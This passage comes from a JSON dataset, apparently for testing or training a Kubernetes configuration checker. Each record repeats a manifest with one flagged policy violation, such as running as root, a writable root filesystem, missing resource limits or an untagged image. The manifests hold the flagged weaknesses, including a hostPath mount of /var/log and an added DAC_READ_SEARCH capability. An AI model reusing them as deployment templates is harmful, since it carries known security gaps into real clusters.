    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-mdm-server-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-mdm-server\n  template:\n    metadata:\n      labels:\n        app: linkis-mdm-server\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-mdm-server\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-mdm-server\n        image: zhangrong1027/linkis:linkis-mdm-server-0.10.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 22001\n        livenessProbe:\n          tcpSocket:\n            port: 22001\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '22001'\n        volumeMounts:\n        - name: linkis-mdm-server-config\n          mountPath: /opt/ihome/conf\n        - name: varlog\n          mountPath: /opt/ihome/linkis-mdm-server/logs\n      volumes:\n      - name: linkis-mdm-server-config\n        configMap:\n          name: linkis-mdm-server-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"linkis-mdm-server\" is not set to runAsNonRoot"
  },
  {
    "id": "00897",
    "manifest_path": "data/manifests/the_stack_sample/sample_0204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-mdm-server-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-mdm-server\n  template:\n    metadata:\n      labels:\n        app: linkis-mdm-server\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-mdm-server\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-mdm-server\n        image: zhangrong1027/linkis:linkis-mdm-server-0.10.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 22001\n        livenessProbe:\n          tcpSocket:\n            port: 22001\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '22001'\n        volumeMounts:\n        - name: linkis-mdm-server-config\n          mountPath: /opt/ihome/conf\n        - name: varlog\n          mountPath: /opt/ihome/linkis-mdm-server/logs\n      volumes:\n      - name: linkis-mdm-server-config\n        configMap:\n          name: linkis-mdm-server-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"linkis-mdm-server\" has cpu request 0"
  },
  {
    "id": "00898",
    "manifest_path": "data/manifests/the_stack_sample/sample_0204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-mdm-server-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-mdm-server\n  template:\n    metadata:\n      labels:\n        app: linkis-mdm-server\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-mdm-server\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-mdm-server\n        image: zhangrong1027/linkis:linkis-mdm-server-0.10.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 22001\n        livenessProbe:\n          tcpSocket:\n            port: 22001\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '22001'\n        volumeMounts:\n        - name: linkis-mdm-server-config\n          mountPath: /opt/ihome/conf\n        - name: varlog\n          mountPath: /opt/ihome/linkis-mdm-server/logs\n      volumes:\n      - name: linkis-mdm-server-config\n        configMap:\n          name: linkis-mdm-server-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"linkis-mdm-server\" has memory limit 0"
  },
  {
    "id": "00899",
    "manifest_path": "data/manifests/the_stack_sample/sample_0207.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flog\n  labels:\n    app: flog\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flog\n  template:\n    metadata:\n      labels:\n        app: flog\n    spec:\n      containers:\n      - name: flog-load\n        image: scalyr/flog:v1\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 300m\n        command:\n        - /bin/flog\n        args:\n        - --loop\n        - --format\n        - apache_combined\n        - -m\n        - ''\n        - -r\n        - /tmp/flog_telemetry.log\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"flog-load\" does not have a read-only root file system"
  },
  {
    "id": "00900",
    "manifest_path": "data/manifests/the_stack_sample/sample_0207.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flog\n  labels:\n    app: flog\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: flog\n  template:\n    metadata:\n      labels:\n        app: flog\n    spec:\n      containers:\n      - name: flog-load\n        image: scalyr/flog:v1\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 300m\n        command:\n        - /bin/flog\n        args:\n        - --loop\n        - --format\n        - apache_combined\n        - -m\n        - ''\n        - -r\n        - /tmp/flog_telemetry.log\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"flog-load\" is not set to runAsNonRoot"
  },
  {
    "id": "00901",
    "manifest_path": "data/manifests/the_stack_sample/sample_0208.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nfs-provisioner\nspec:\n  containers:\n  - name: nfs-provisioner\n    image: quay.io/kubernetes_incubator/nfs-provisioner:v1.0.5\n    ports:\n    - name: nfs\n      containerPort: 2049\n    - name: mountd\n      containerPort: 20048\n    - name: rpcbind\n      containerPort: 111\n    - name: rpcbind-udp\n      containerPort: 111\n      protocol: UDP\n    securityContext:\n      capabilities:\n        add:\n        - DAC_READ_SEARCH\n    args:\n    - -provisioner=example.com/nfs\n    - -grace-period=0\n    env:\n    - name: POD_IP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - name: export-volume\n      mountPath: /export\n  volumes:\n  - name: export-volume\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nfs-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "00902",
    "manifest_path": "data/manifests/the_stack_sample/sample_0208.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nfs-provisioner\nspec:\n  containers:\n  - name: nfs-provisioner\n    image: quay.io/kubernetes_incubator/nfs-provisioner:v1.0.5\n    ports:\n    - name: nfs\n      containerPort: 2049\n    - name: mountd\n      containerPort: 20048\n    - name: rpcbind\n      containerPort: 111\n    - name: rpcbind-udp\n      containerPort: 111\n      protocol: UDP\n    securityContext:\n      capabilities:\n        add:\n        - DAC_READ_SEARCH\n    args:\n    - -provisioner=example.com/nfs\n    - -grace-period=0\n    env:\n    - name: POD_IP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - name: export-volume\n      mountPath: /export\n  volumes:\n  - name: export-volume\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nfs-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "00903",
    "manifest_path": "data/manifests/the_stack_sample/sample_0208.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nfs-provisioner\nspec:\n  containers:\n  - name: nfs-provisioner\n    image: quay.io/kubernetes_incubator/nfs-provisioner:v1.0.5\n    ports:\n    - name: nfs\n      containerPort: 2049\n    - name: mountd\n      containerPort: 20048\n    - name: rpcbind\n      containerPort: 111\n    - name: rpcbind-udp\n      containerPort: 111\n      protocol: UDP\n    securityContext:\n      capabilities:\n        add:\n        - DAC_READ_SEARCH\n    args:\n    - -provisioner=example.com/nfs\n    - -grace-period=0\n    env:\n    - name: POD_IP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - name: export-volume\n      mountPath: /export\n  volumes:\n  - name: export-volume\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nfs-provisioner\" has cpu request 0"
  },
  {
    "id": "00904",
    "manifest_path": "data/manifests/the_stack_sample/sample_0208.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nfs-provisioner\nspec:\n  containers:\n  - name: nfs-provisioner\n    image: quay.io/kubernetes_incubator/nfs-provisioner:v1.0.5\n    ports:\n    - name: nfs\n      containerPort: 2049\n    - name: mountd\n      containerPort: 20048\n    - name: rpcbind\n      containerPort: 111\n    - name: rpcbind-udp\n      containerPort: 111\n      protocol: UDP\n    securityContext:\n      capabilities:\n        add:\n        - DAC_READ_SEARCH\n    args:\n    - -provisioner=example.com/nfs\n    - -grace-period=0\n    env:\n    - name: POD_IP\n      valueFrom:\n        fieldRef:\n          fieldPath: status.podIP\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - name: export-volume\n      mountPath: /export\n  volumes:\n  - name: export-volume\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nfs-provisioner\" has memory limit 0"
  },
  {
    "id": "00905",
    "manifest_path": "data/manifests/the_stack_sample/sample_0210.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00906",
    "manifest_path": "data/manifests/the_stack_sample/sample_0210.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "00907",
    "manifest_path": "data/manifests/the_stack_sample/sample_0210.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "00908",
    "manifest_path": "data/manifests/the_stack_sample/sample_0210.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "00909",
    "manifest_path": "data/manifests/the_stack_sample/sample_0210.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "00910",
    "manifest_path": "data/manifests/the_stack_sample/sample_0212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook-server\n  labels:\n    app: webhook-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook-server\n  template:\n    metadata:\n      labels:\n        app: webhook-server\n    spec:\n      containers:\n      - name: server\n        image: quay.io/masood_faisal/webhooks:0.0.1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /etc/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "00911",
    "manifest_path": "data/manifests/the_stack_sample/sample_0212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook-server\n  labels:\n    app: webhook-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook-server\n  template:\n    metadata:\n      labels:\n        app: webhook-server\n    spec:\n      containers:\n      - name: server\n        image: quay.io/masood_faisal/webhooks:0.0.1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /etc/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "00912",
    "manifest_path": "data/manifests/the_stack_sample/sample_0212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook-server\n  labels:\n    app: webhook-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook-server\n  template:\n    metadata:\n      labels:\n        app: webhook-server\n    spec:\n      containers:\n      - name: server\n        image: quay.io/masood_faisal/webhooks:0.0.1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /etc/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "00913",
    "manifest_path": "data/manifests/the_stack_sample/sample_0212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook-server\n  labels:\n    app: webhook-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook-server\n  template:\n    metadata:\n      labels:\n        app: webhook-server\n    spec:\n      containers:\n      - name: server\n        image: quay.io/masood_faisal/webhooks:0.0.1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /etc/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "00914",
    "manifest_path": "data/manifests/the_stack_sample/sample_0214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: get-started-node\n  labels:\n    app: get-started-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: get-started-node\n  template:\n    metadata:\n      labels:\n        app: get-started-node\n    spec:\n      containers:\n      - name: get-started-node\n        image: <REGISTRY>/<NAMESPACE>/myapp:v1.1.0\n        ports:\n        - containerPort: 8080\n        imagePullPolicy: Always\n        env:\n        - name: CLOUDANT_URL\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: url\n              optional: true\n        - name: CLOUDANT_IAM_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: iamApiKey\n              optional: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"get-started-node\" does not have a read-only root file system"
  },
  {
    "id": "00915",
    "manifest_path": "data/manifests/the_stack_sample/sample_0214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: get-started-node\n  labels:\n    app: get-started-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: get-started-node\n  template:\n    metadata:\n      labels:\n        app: get-started-node\n    spec:\n      containers:\n      - name: get-started-node\n        image: <REGISTRY>/<NAMESPACE>/myapp:v1.1.0\n        ports:\n        - containerPort: 8080\n        imagePullPolicy: Always\n        env:\n        - name: CLOUDANT_URL\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: url\n              optional: true\n        - name: CLOUDANT_IAM_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: iamApiKey\n              optional: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"get-started-node\" is not set to runAsNonRoot"
  },
  {
    "id": "00916",
    "manifest_path": "data/manifests/the_stack_sample/sample_0214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: get-started-node\n  labels:\n    app: get-started-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: get-started-node\n  template:\n    metadata:\n      labels:\n        app: get-started-node\n    spec:\n      containers:\n      - name: get-started-node\n        image: <REGISTRY>/<NAMESPACE>/myapp:v1.1.0\n        ports:\n        - containerPort: 8080\n        imagePullPolicy: Always\n        env:\n        - name: CLOUDANT_URL\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: url\n              optional: true\n        - name: CLOUDANT_IAM_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: iamApiKey\n              optional: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"get-started-node\" has cpu request 0"
  },
  {
    "id": "00917",
    "manifest_path": "data/manifests/the_stack_sample/sample_0214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: get-started-node\n  labels:\n    app: get-started-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: get-started-node\n  template:\n    metadata:\n      labels:\n        app: get-started-node\n    spec:\n      containers:\n      - name: get-started-node\n        image: <REGISTRY>/<NAMESPACE>/myapp:v1.1.0\n        ports:\n        - containerPort: 8080\n        imagePullPolicy: Always\n        env:\n        - name: CLOUDANT_URL\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: url\n              optional: true\n        - name: CLOUDANT_IAM_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloudant\n              key: iamApiKey\n              optional: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"get-started-node\" has memory limit 0"
  },
  {
    "id": "00918",
    "manifest_path": "data/manifests/the_stack_sample/sample_0222.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"quobyte\" is using an invalid container image, \"kubernetes/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00919",
    "manifest_path": "data/manifests/the_stack_sample/sample_0222.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"quobyte\" does not have a read-only root file system"
  },
  {
    "id": "00920",
    "manifest_path": "data/manifests/the_stack_sample/sample_0222.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"quobyte\" is not set to runAsNonRoot"
  },
  {
    "id": "00921",
    "manifest_path": "data/manifests/the_stack_sample/sample_0222.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"quobyte\" has cpu request 0"
  },
  {
    "id": "00922",
    "manifest_path": "data/manifests/the_stack_sample/sample_0222.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: quobyte\nspec:\n  containers:\n  - name: quobyte\n    image: kubernetes/pause\n    volumeMounts:\n    - mountPath: /mnt\n      name: quobytevolume\n  volumes:\n  - name: quobytevolume\n    quobyte:\n      registry: registry:7861\n      volume: testVolume\n      readOnly: false\n      user: root\n      group: root\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"quobyte\" has memory limit 0"
  },
  {
    "id": "00923",
    "manifest_path": "data/manifests/the_stack_sample/sample_0223.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-unbherbarium-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-unbherbarium-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: unbherbarium-lib-unb-ca\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cron-unbherbarium-lib-unb-ca\" is using an invalid container image, \"||DEPLOYMENTIMAGE||\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00924",
    "manifest_path": "data/manifests/the_stack_sample/sample_0223.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-unbherbarium-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-unbherbarium-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: unbherbarium-lib-unb-ca\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cron-unbherbarium-lib-unb-ca\" does not have a read-only root file system"
  },
  {
    "id": "00925",
    "manifest_path": "data/manifests/the_stack_sample/sample_0223.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-unbherbarium-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-unbherbarium-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: unbherbarium-lib-unb-ca\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cron-unbherbarium-lib-unb-ca\" is not set to runAsNonRoot"
  },
  {
    "id": "00926",
    "manifest_path": "data/manifests/the_stack_sample/sample_0223.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-unbherbarium-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-unbherbarium-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: unbherbarium-lib-unb-ca\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cron-unbherbarium-lib-unb-ca\" has cpu request 0"
  },
  {
    "id": "00927",
    "manifest_path": "data/manifests/the_stack_sample/sample_0223.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-unbherbarium-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-unbherbarium-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: unbherbarium-lib-unb-ca\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cron-unbherbarium-lib-unb-ca\" has memory limit 0"
  },
  {
    "id": "00928",
    "manifest_path": "data/manifests/the_stack_sample/sample_0225.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200501-e6124e633\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account,node-e2e-project\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"boskos-reaper\" does not have a read-only root file system"
  },
  {
    "id": "00929",
    "manifest_path": "data/manifests/the_stack_sample/sample_0225.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200501-e6124e633\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account,node-e2e-project\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"boskos-reaper\" is not set to runAsNonRoot"
  },
  {
    "id": "00930",
    "manifest_path": "data/manifests/the_stack_sample/sample_0225.yaml",
